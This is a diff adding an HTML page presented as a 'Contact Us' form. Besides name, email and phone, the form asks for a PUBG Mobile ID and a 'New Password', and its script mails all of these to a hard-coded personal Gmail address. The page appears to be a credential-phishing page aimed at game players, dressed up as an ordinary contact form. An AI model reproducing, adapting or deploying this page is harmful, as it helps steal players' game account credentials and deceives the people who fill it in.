@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Contact Us</title>
+  <style>body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 20px;
+}
+
+h1 {
+  text-align: center;
+}
+
+.form-group {
+  margin-bottom: 15px;
+}
+
+label {
+  display: block;
+  font-weight: bold;
+  margin-bottom: 5px;
+}
+
+input[type="text"],
+input[type="email"],
+input[type="tel"],
+input[type="password"] {
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+}
+
+input[type="submit"] {
+  padding: 10px 20px;
+  background-color: #4CAF50;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+}
+
+input[type="submit"]:hover {
+  background-color: #45a049;
+}
+</style>
+</head>
+<body>
+  <h1>Contact Us</h1>
+  <form id="contact-form">
+    <div class="form-group">
+      <label for="name">Name*</label>
+      <input type="text" id="name" name="name" required>
+    </div>
+    <div class="form-group">
+      <label for="email">Email*</label>
+      <input type="email" id="email" name="email" required>
+    </div>
+    <div class="form-group">
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" name="phone">
+    </div>
+    <div class="form-group">
+      <label for="pubg-id">PUBG Mobile ID</label>
+      <input type="text" id="pubg-id" name="pubg-id">
+    </div>
+    <div class="form-group">
+      <label for="new-password">New Password</label>
+      <input type="password" id="new-password" name="new-password">
+    </div>
+    <div class="form-group">
+      <input type="submit" value="Submit">
+    </div>
+  </form>
+  <script>document.getElementById('contact-form').addEventListener('submit', function(e) {
+  e.preventDefault(); // Prevent form submission
+
+  // Get form values
+  var name = document.getElementById('name').value;
+  var email = document.getElementById('email').value;
+  var phone = document.getElementById('phone').value;
+  var pubgId = document.getElementById('pubg-id').value;
+  var newPassword = document.getElementById('new-password').value;
+
+  // Send the email (replace with your own backend implementation)
+  var mailtoLink = 'mailto:youseffo2fo2@gmail.com' +
+    '?subject=Contact Form Submission' +
+    '&body=Name: ' + encodeURIComponent(name) +
+    '%0AEmail: ' + encodeURIComponent(email) +
+    '%0APhone Number: ' + encodeURIComponent(phone) +
+    '%0APUBG Mobile ID: ' + encodeURIComponent(pubgId) +
+    '%0ANew Password: ' + encodeURIComponent(newPassword);
+  window.location.href = mailtoLink;
+
+  // Optionally, you can reset the form fields after submission
+  document.getElementById('contact-form').reset();
+});
+</script>
+</body>
+</html>
